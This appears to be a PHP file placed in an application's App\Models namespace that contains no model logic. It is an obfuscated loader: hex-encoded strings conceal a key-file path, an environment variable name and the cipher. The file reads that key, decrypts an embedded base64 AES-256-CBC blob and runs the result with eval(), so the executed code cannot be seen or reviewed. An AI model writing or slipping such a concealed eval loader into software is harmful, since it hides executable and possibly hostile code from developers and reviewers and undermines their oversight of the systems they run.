<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+dcZLH0ob7qim40jnz6vTA==');

$c=base64_decode(

'jyiygnNjELyd3a0SrNJda+jreUfn8YuAne0q68/hrC3S56WhNi2XvROwJ/E0X+z6y5x+9fr4KTnh' .
'1uOaKw3MaP3AshSAMOhobNOGSLMTJbKOSrejkYl+7JvJ8juyTHsBb3DsxtpbC/rWtQdj15JYpDfL' .
'TY19oe4BVhBQJwkd1FZzvh/2njnj/cnqkCi6/2AcENnkF1q0dTZ+zj7VTcxNPot1U87RzQVG1vOB' .
'Rlxzr4hmOtiiBRxgYCoJERvzW95RCQYEl3dyt6q2tSj0/pulPV9zN7PYI9AwlpzTeXQ8/oa92FC/' .
'B7S1ZqyQhh5qxWqav4geuGLuVJLltm3KeNYK4ROKHpSWnssZsdOG/23GtAjEk9CQsIafympcuVuC' .
'ymKV9rqf5Ck9HDI0vKPNS0qC9VL1a5HWS+hMdjHlJXgoa5+SKQhefuxuOAPx/tLCiH55ML2ReqGS' .
'yRT3QygDKrjzK0Us/sgpTsZMhIlvvu5oj6HTec6LJ6LhCkkciNXNft28WMN34tZEl+QOLaN+hGfA' .
'RnBSLgRNvOa1t7n6fTvOKkIGh5pBc9EWEzBnxdBV8BpMKLuegfI1HNDmzsOsdptVfjzLRIIPL9+f' .
'lKGR9MSeOqd7iEp1zHlUsnp+0FKVGGR1Bl3LCEC1IpYBzbmM3N4PtsP8jYFPpMu1mijIfolVn9AC' .
'Bx7iEG7HcN6Dsmg+BAKeTtj2ygjtFXwMePnXOX0lCkd5/voacf475sDlpRLmoeQ6x6GZm2c9Qoau' .
'0Cpuwzcny0oB5tsF+OudUbYxZUA0VA0bxeK2Cjl8fCLddbHJy1xkdNeT9lgWSgE3rcmGCGn1hrbI' .
'DgOqr9c+Va35E7nkvhhVZNQ65lQ45AtF3j3R11+V/bLeQGrIOqLVGvMXv9MdQDnWguk3SuL5r5m5' .
'1iA5Eg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

